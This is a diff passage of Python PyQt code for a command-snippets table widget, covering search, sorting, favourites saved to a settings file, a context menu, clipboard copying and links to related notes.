+        self.lbl_page=QLabel("0 of 0",self.pager);self.lbl_page.setObjectName("CommandsPageLabel");self.lbl_page.setAlignment(Qt.AlignmentFlag.AlignCenter);self.lbl_page.setMinimumWidth(72)
+        self.btn_prev.clicked.connect(self._prev_page);self.btn_next.clicked.connect(self._next_page)
+        mid.addWidget(self.btn_prev,0,Qt.AlignmentFlag.AlignCenter);mid.addWidget(self.lbl_page,0,Qt.AlignmentFlag.AlignCenter);mid.addWidget(self.btn_next,0,Qt.AlignmentFlag.AlignCenter)
+        self.pager_right=QWidget(self.pager);self.pager_right.setFixedWidth(150)
+        right=QHBoxLayout(self.pager_right);right.setContentsMargins(0,0,0,0);right.setSpacing(8)
+        self.cmb_per=QComboBox(self.pager_right);self.cmb_per.setObjectName("CommandsPerPage");self.cmb_per.setMinimumWidth(66);self.cmb_per.setMaximumWidth(66);self.cmb_per.addItems(["10","20","50","100"]);self.cmb_per.setCurrentText("10");self.cmb_per.currentTextChanged.connect(self._on_per_page)
+        self.lbl_per=QLabel("per page",self.pager_right);self.lbl_per.setObjectName("CommandsPerPageLbl")
+        right.addWidget(self.cmb_per,0);right.addWidget(self.lbl_per,0)
+        ph.addWidget(self.pager_left,0);ph.addStretch(1);ph.addLayout(mid,0);ph.addStretch(1);ph.addWidget(self.pager_right,0)
+        tw.addWidget(self.pager,0)
+        v.addLayout(top);v.addWidget(self.tbl_wrap,1)
+        QTimer.singleShot(0,self.reload)
+        self.t=QTimer(self);self.t.setInterval(900);self.t.timeout.connect(self._tick);self.t.start()
+        _log("[+]",f"Snippets table ready")
+    def _settings_path(self):
+        d=_abs("..","Data");os.makedirs(d,exist_ok=True);return os.path.join(d,"settings.json")
+    def _load_icons(self):
+        on=_abs("..","Assets","Fav_selected.png");off=_abs("..","Assets","Fav.png")
+        if os.path.isfile(on):self._fav_icon_on=QIcon(on)
+        if os.path.isfile(off):self._fav_icon=QIcon(off)
+    def _fav_key(self,n):
+        if not isinstance(n,dict):return ""
+        src=n.get("src") or ""
+        cid=n.get("id")
+        if cid is not None:return f"{src}:{cid}"
+        cmd=n.get("command") or ""
+        if cmd:return cmd.strip().lower()
+        title=n.get("title") or ""
+        return title.strip().lower()
+    def _load_favorites(self):
+        d=_read_json(self._settings_path(),{})
+        m=d.get("mini_window",{}) if isinstance(d,dict) else {}
+        favs=m.get("favorites",[]) if isinstance(m,dict) else []
+        if not isinstance(favs,list):favs=[]
+        return [str(x) for x in favs if str(x).strip()],bool(m.get("favorites_only",False)) if isinstance(m,dict) else False
+    def _save_favorites(self):
+        d=_read_json(self._settings_path(),{})
+        if not isinstance(d,dict):d={}
+        m=d.get("mini_window",{}) if isinstance(d.get("mini_window",{}),dict) else {}
+        m["favorites"]=sorted(list(self._favorites));d["mini_window"]=m;_write_json(self._settings_path(),d)
+    def _save_favorites_only(self):
+        d=_read_json(self._settings_path(),{})
+        if not isinstance(d,dict):d={}
+        m=d.get("mini_window",{}) if isinstance(d.get("mini_window",{}),dict) else {}
+        m["favorites_only"]=bool(self._favorites_only);d["mini_window"]=m;_write_json(self._settings_path(),d)
+    def _compact_cmd(self,cmd):
+        raw=_norm(cmd)
+        if not raw:return ""
+        lines=[ln.strip() for ln in raw.splitlines()]
+        text=" ".join([ln for ln in lines if ln])
+        return re.sub(r"\s+"," ",text).strip()
+    def _cmd_preview(self,n):
+        return self.rep.apply(n.get("command","")) if n else ""
+    def _sort_key(self,n):
+        return (_l(n.get("title","")),_l(n.get("category","")),_l(n.get("sub","")),_l(n.get("command","")))
+    def _sort_rows(self,rows):
+        mode=getattr(self,"_sort_mode","A -> Z")
+        rows=list(rows or [])
+        if mode=="Z -> A":return sorted(rows,key=self._sort_key,reverse=True)
+        if mode=="Newest":return sorted(rows,key=lambda n:int(n.get("id",0) or 0),reverse=True)
+        if mode=="Fav First":return sorted(rows,key=lambda n:(0 if self._fav_key(n) in self._favorites else 1,self._sort_key(n)))
+        return sorted(rows,key=self._sort_key)
+    def reload(self):
+        self._db_path,self._cmds=_load_cmds(self._db_path)
+        self._db_mtime=_safe_mtime(self._db_path)
+        self._apply()
+    def refresh(self):
+        self.reload()
+    def _tick(self):
+        p=_db_path();mt=_safe_mtime(p)
+        if p!=self._db_path or mt!=self._db_mtime:
+            self.reload();return
+        if self.ctx.changed():
+            self.ctx.reload();self._render()
+    def _apply(self):
+        q=_l(self.search.text())
+        base=[]
+        for n in self._cmds:
+            if q:
+                blob=" ".join([n.get("title",""),n.get("note_name",""),n.get("group_name",""),n.get("category",""),n.get("sub",""),n.get("tags",""),n.get("command",""),n.get("description","")])
+                if q not in _l(blob):continue
+            base.append(n)
+        if self._favorites_only:base=[n for n in base if self._fav_key(n) in self._favorites]
+        self._view=self._sort_rows(base)
+        self._render()
+    def _render(self):
+        rows=self._view;self.lbl_total.setText(f"Total: {len(rows)}")
+        self.table.setRowCount(len(rows))
+        for r,n in enumerate(rows):self._set_row(r,n)
+        self.table.clearSelection()
+    def _set_item(self,row,col,text,full=None,align=None,bold=False):
+        it=QTableWidgetItem(text)
+        it.setFlags(Qt.ItemFlag.ItemIsEnabled|Qt.ItemFlag.ItemIsSelectable)
+        if align is not None:it.setTextAlignment(align)
+        if bold:
+            f=it.font();f.setBold(True);f.setWeight(800);it.setFont(f)
+        if full is not None:it.setData(Qt.ItemDataRole.UserRole,full)
+        self.table.setItem(row,col,it)
+    def _set_row(self,r,n):
+        key=self._fav_key(n);is_fav=key in self._favorites
+        fav=QTableWidgetItem("")
+        icon=self._fav_icon_on if is_fav else self._fav_icon
+        if icon:fav.setIcon(icon)
+        fav.setTextAlignment(Qt.AlignmentFlag.AlignCenter);fav.setToolTip("Toggle favorite")
+        cat=_norm(n.get("category",""));sub=_norm(n.get("sub",""));tags=_norm(n.get("tags",""))
+        meta=[]
+        if tags:meta.append(f"tags: {tags}")
+        if _norm(n.get("note_name","")):meta.append(f"note: {_norm(n.get('note_name',''))}")
+        cat_item=QTableWidgetItem(cat or "Uncategorized");cat_item.setData(Qt.ItemDataRole.UserRole,n);cat_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);cat_item.setToolTip(" | ".join(meta) if meta else (cat or "Uncategorized"))
+        sub_item=QTableWidgetItem(sub or "General");sub_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);sub_item.setToolTip(sub or "General")
+        cmd=self._cmd_preview(n);compact=self._compact_cmd(cmd)
+        cmd_item=QTableWidgetItem(compact);cmd_item.setToolTip(cmd);cmd_item.setTextAlignment(Qt.AlignmentFlag.AlignVCenter|Qt.AlignmentFlag.AlignLeft)
+        self.table.setItem(r,0,fav);self.table.setItem(r,1,cat_item);self.table.setItem(r,2,sub_item);self.table.setItem(r,3,cmd_item)
+        self.table.setRowHeight(r,60)
+    def _row_item(self,row):
+        it=self.table.item(row,1)
+        if not it:return None
+        d=it.data(Qt.ItemDataRole.UserRole)
+        return d if isinstance(d,dict) else None
+    def _copy(self,n,raw=False):
+        if not n:return
+        cmd=n.get("command","") if raw else self._cmd_preview(n)
+        try:
+            QApplication.clipboard().setText(cmd or "")
+            _log("[+]",f"Copied snippet: {n.get('title','')}")
+        except Exception as e:_log("[!]",f"Clipboard error ({e})")
+    def _nav_notes(self):
+        try:w=self.window()
+        except Exception:return None
+        if w and hasattr(w,"on_nav"):
+            try:w.on_nav("notes")
+            except Exception:pass
+        return getattr(w,"page_notes",None) if w else None
+    def _related_note_ref(self,n):
+        if not isinstance(n,dict):return None
+        try:return _note_refs.resolve_note_ref(_db_path(),note_id=n.get("note_id"),note_name=n.get("note_name",""))
+        except Exception:return None
+    def _has_related_note(self,n):
+        return bool(_command_related.related_notes(_db_path(),n))
+    def _open_related_note(self,n):
+        if not isinstance(n,dict):return False
+        return _command_related.open_related_notes(self,n,_db_path(),self._nav_notes)
+    def _toggle_favorite(self,n):
+        if not n:return
+        k=self._fav_key(n)
+        if k in self._favorites:self._favorites.remove(k)
+        else:self._favorites.add(k)
+        self._save_favorites();self._apply()
+    def _on_cell_click(self,row,col):
+        n=self._row_item(row)
+        if not n:return
+        if col==0:self._toggle_favorite(n);return
+        self._copy(n,raw=False)
+    def _on_cell_double(self,row,col):
+        self._copy(self._row_item(row),raw=False)
+    def _ctx_menu(self,pos:QPoint):
+        ix=self.table.indexAt(pos)
+        if not ix.isValid():return
+        row=ix.row();self.table.selectRow(row);n=self._row_item(row)
+        if not n:return
+        fav_label="Remove Favorite" if self._fav_key(n) in self._favorites else "Add Favorite"
+        menu=QMenu(self)
+        show_note=QAction("Show in Note",self);show_note.setEnabled(self._has_related_note(n));show_note.triggered.connect(lambda:self._on_show_in_note(n))
+        a1=QAction("Copy Command",self);a1.triggered.connect(lambda:self._copy(n,raw=False))
+        a2=QAction("Copy Raw Command",self);a2.triggered.connect(lambda:self._copy(n,raw=True))
+        a3=QAction(fav_label,self);a3.triggered.connect(lambda:self._toggle_favorite(n))
+        a4=QAction("Copy Title",self);a4.triggered.connect(lambda:QApplication.clipboard().setText(n.get("title","") or ""))
+        menu.addAction(show_note);menu.addSeparator();menu.addAction(a1);menu.addAction(a2);menu.addSeparator();menu.addAction(a3);menu.addSeparator();menu.addAction(a4)
+        menu.exec(self.table.viewport().mapToGlobal(pos))
+    def _on_show_in_note(self,n):
+        res=self._open_related_note(n)
+        if res is None or res:return
+        QMessageBox.information(self,"Show in Note","Related note not found.")
+    def _prev_page(self):
+        pass
+    def _next_page(self):
+        pass
+    def _on_per_page(self,t):
+        try:self._per=max(1,int(t))
+        except:self._per=10
+        self._page=1;self._render()
+    def _on_search(self,t):
+        self._apply()
+    def _set_sort_mode(self,mode):
+        self._sort_mode=mode or "A -> Z";self._apply()
+    def _on_favorites(self,checked):
+        self._favorites_only=bool(checked);self._save_favorites_only();self._apply()
